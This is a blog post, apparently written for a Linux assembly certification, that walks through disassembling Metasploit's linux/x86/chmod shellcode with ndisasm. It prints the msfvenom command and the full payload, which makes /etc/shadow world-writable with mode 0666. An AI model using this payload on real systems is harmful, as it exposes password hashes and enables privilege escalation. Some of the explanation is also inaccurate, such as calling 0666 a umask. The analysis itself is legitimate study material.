---
title: "Linux x86 Shellcoding: Analysis of linux/x86/chmod with ndisasm"
date: 2018-04-10T20:12:07+02:00
---

Our goal will be to analyze the `linux/x86/chmod` payload that comes bundled with Metasploit. In order to do so, we will use ndisasm to disassemble it.

First, we will check out which options are needed to generate a sample with `msfvenom`.

```shell
root@kali:~# msfvenom -p linux/x86/chmod --payload-options
Options for payload/linux/x86/chmod:


       Name: Linux Chmod
     Module: payload/linux/x86/chmod
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 36
       Rank: Normal

Provided by:
    kris katterjohn <katterjohn@gmail.com>

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
  Runs chmod on specified file with specified mode


Advanced options for payload/linux/x86/chmod:
...

```

Therefore, we can directly use the default options for our demonstration purposes.

We can then generate the payload with msfvenom and pipe it to ndisasm by using the following command:

```shell
root@kali:~# msfvenom -p linux/x86/chmod -f raw | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes

00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80C000000        call 0x16
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
```

Ndisasm has given us the x86 assembly representation of the generated shellcode. Let's analyze it in chunks.

```x86asm
cdq
push byte +0xf
pop eax
push edx
call 0x16
```

The first instruction `cdq` will copy the sign bit (31) in `EAX` to all the positions in `EDX`. Supposing that `EAX` is positive, then this will effectively zero out `EDX`.

The next `push` `pop` `push` sequence sets `EAX` to 0xF (syscall for `chmod()`) and sets the top of the stack to zero.

The next `call` instruction will move the execution to offset `0x16`, but note that before that position the instructions shown make no sense. We print those bytes and find that there we have the file `chmod` will be called on.

```
root@kali:~# echo -e "\x2F\x65\x74\x63\x2F\x73\x68\x61\x64\x6F\x77\x00"
/etc/shadow
```

We continue with the following instructions:

```
pop ebx
push dword 0x1b6
pop ecx
int 0x80
```

The first `pop` sets `EBX` to the address where the `/etc/shadow` string starts (since the previously executed `call` instruction pushes the return address into the stack), and the following `pop` `push` sequence sets `ECX` to `0x1b6` (0666 in octal, the umask that defines our permissions).

The `pop ecx` will set `ECX` to zero (as this value was pushed into the stack beforehand).

Calling `int 0x80` will execute the `chmod` (as defined by `EAX`) system call with arguments defined by `EBX` and `ECX`, therefore `/etc/shadow/` and 0666 respectively.

The only thing left now is gracefully exit to avoid executing reaching addresses with invalid instructions that would make our program crash:

```
push byte +0x1
pop eax
int 0x80
```

This saves the syscall number (1 in for `exit()`) into `EAX` and executes the syscall, exiting our program.

---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:*

http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

*Student ID: SLAE-964*
